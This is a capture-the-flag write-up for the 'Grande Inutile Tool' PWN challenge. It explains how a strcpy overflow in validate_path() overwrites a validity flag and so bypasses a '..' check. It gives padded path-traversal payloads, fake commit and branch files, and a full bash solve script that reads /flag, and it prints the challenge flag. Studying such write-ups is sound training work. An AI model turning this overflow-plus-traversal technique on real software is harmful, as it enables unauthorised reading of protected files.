# Grande Inutile Tool - Full Solution

## Challenge Info
- **Category**: PWN
- **Flag**: `pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_btw}`
- **Description**: A custom git-like tool with path validation vulnerabilities

## Vulnerability Analysis

### Buffer Overflow in `validate_path()`

The binary has a buffer overflow in the `validate_path` function at address `0x312c`:

```c
int validate_path(char *path) {
    char buffer[32];      // rbp-0x30
    int valid = 1;        // rbp-0x10
    // [stack canary at rbp-0x08]

    if (strstr(path, ".."))
        valid = 0;

    strcpy(buffer, path);  // OVERFLOW HERE!

    return valid;
}
```

**Stack Layout:**
- `rbp-0x30`: 32-byte buffer
- `rbp-0x10`: 4-byte validity flag
- `rbp-0x08`: stack canary

**Exploitation:**
- Paths 33+ bytes overflow into the `valid` flag
- If bytes 33-36 are non-zero, function returns "valid" despite containing `..`
- Paths must stay under ~40 bytes to avoid corrupting the stack canary

### Key Constraints
- Path must be 33-40 bytes for successful overflow
- Use `./` padding (not `X/`) because `.` always exists as a directory
- The `commit_current()` function truncates content to 40 bytes via `strncpy(..., 0x28)`

## Exploit #1: Basic (40 bytes only)

This extracts only the first 40 characters of the flag:

```bash
mygit init
mygit branch test

# Checkout to /flag - sets HEAD to point to /flag
mygit checkout './././././././../../../../../../flag'

# Create branch - writes flag content (truncated to 40 bytes) to accessible location
mygit branch './././././././././../../../../FLAG'

# Read partial flag
cat /home/FLAG
# Output: pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_
```

**Why truncation occurs:**
`commit_current()` at `0x277b` uses `strncpy(hash.0, content, 0x28)` limiting output to 40 bytes.

## Exploit #2: Advanced (Full 44-byte flag)

### Key Insight

The `checkout` command's file restoration doesn't truncate:
1. `object_read(hash)` reads from `.mygit/objects/<hash>` - FULL content
2. `file_write(path, content, size)` writes FULL content

If we can control the `hash` to contain path traversal (e.g., `../../../../../flag`), `object_read` will read `/flag` directly!

### Attack Chain

```
checkout(branch_name)
    │
    ▼
branch_get_commit() reads from .mygit/refs/heads/<branch_name>
    │                              │
    │                              └─► Path traversal → reads ~/myhead
    ▼
validate_path(commit_hash)  ◄── Overflow bypasses check
    │
    ▼
commit_read() reads from .mygit/commits/<commit_hash>
    │                              │
    │                              └─► Path traversal → reads ~/fc
    ▼
For each file entry in commit:
    │
    ├─► validate_path(file_hash)   ◄── Overflow bypasses check
    │
    ├─► object_read(file_hash)     ◄── Reads .mygit/objects/<hash>
    │                                       │
    │                                       └─► Path traversal → reads /flag (FULL!)
    │
    └─► file_write(filename, content, size)  ◄── Writes FULL flag content
```

### Exploit Steps

**Step 1: Create fake commit file (`~/fc`)**

```bash
cat > ~/fc << 'EOF'
parent 0000000000000000000000000000000000000000
timestamp 1234567890
message pwned
files 1
../../../../../././././././././././flag FULLFLAG
EOF
```

The hash field `../../../../../././././././././././flag`:
- `../../../../../` (15 chars) - escapes from `.mygit/objects/` to `/`
- `./` × 10 (20 chars) - padding for overflow (33+ total)
- `flag` (4 chars) - target file
- Total: 39 chars (overflow occurs at 33+)

**Step 2: Create fake branch pointer (`~/myhead`)**

```bash
STR="../../../"
for i in {1..14}; do STR="${STR}./"; done
STR="${STR}fc"
printf "%s" "$STR" > ~/myhead
```

This creates: `../../../././././././././././././././fc` (39 chars)
- `../../../` (9 chars) - escapes from `.mygit/commits/` to `~`
- `./` × 14 (28 chars) - padding for overflow
- `fc` (2 chars) - target file

**Step 3: Setup and execute**

```bash
mkdir ~/exploit && cd ~/exploit
mygit init
mygit branch dummy

# Checkout using path traversal to reach ~/myhead
# Path: ././././././././../../../../myhead (34 chars, causes overflow)
mygit checkout "././././././././../../../../myhead"
```

**Step 4: Read full flag**

```bash
cat ~/exploit/FULLFLAG
# Output: pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_btw}
```

## Path Traversal Math

### From `.mygit/refs/heads/` to `~/myhead`:
```
.mygit/refs/heads/
    ../  → .mygit/refs/
    ../  → .mygit/
    ../  → repo_root/
    ../  → ~/
    myhead → ~/myhead
```
Need: `../../../../myhead` + padding = 33+ chars

### From `.mygit/commits/` to `~/fc`:
```
.mygit/commits/
    ../  → .mygit/
    ../  → repo_root/
    ../  → ~/
    fc   → ~/fc
```
Need: `../../../fc` + padding = 33+ chars

### From `.mygit/objects/` to `/flag`:
```
.mygit/objects/
    ../  → .mygit/
    ../  → repo_root/
    ../  → ~/
    ../  → /home/
    ../  → /
    flag → /flag
```
Need: `../../../../../flag` + padding = 33+ chars

## Binary Analysis Details

### Key Functions

| Function | Address | Purpose |
|----------|---------|---------|
| `validate_path` | 0x312c | Vulnerable path validation |
| `commit_current` | 0x2646 | Reads HEAD, returns 40-byte hash |
| `branch_checkout` | 0x35ac | Restores files from commit |
| `object_read` | 0x1e11 | Reads from objects (no truncation) |
| `file_write` | 0x44f8 | Writes full content |
| `commit_read` | 0x2c31 | Parses commit files |

### Truncation Point

In `commit_current()` at `0x277b`:
```asm
mov    $0x28,%edx           ; 40 bytes
call   strncpy@plt
```

### No Truncation in checkout

In `branch_checkout()` file restoration loop:
```asm
call   object_read          ; Reads FULL content
...
call   file_write           ; Writes FULL content
```

## Complete Solve Script

```bash
#!/bin/bash
# Full flag extraction for Grande Inutile Tool

cd ~
rm -rf exploit fc myhead

# Create fake commit with path traversal hash pointing to /flag
cat > fc << 'EOF'
parent 0000000000000000000000000000000000000000
timestamp 1234567890
message pwned
files 1
../../../../../././././././././././flag FULLFLAG
EOF

# Create fake branch pointer to our fake commit
# ../../../ (9) + ./ × 14 (28) + fc (2) = 39 chars
STR="../../../"
for i in {1..14}; do STR="${STR}./"; done
STR="${STR}fc"
printf "%s" "$STR" > myhead

# Setup repo
mkdir exploit && cd exploit
mygit init
mygit branch dummy

# Trigger the exploit - checkout to our fake branch
mygit checkout "././././././././../../../../myhead"

# Read the full flag
echo "=== FULL FLAG ==="
cat FULLFLAG
```

## Flag
```
pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_btw}
```
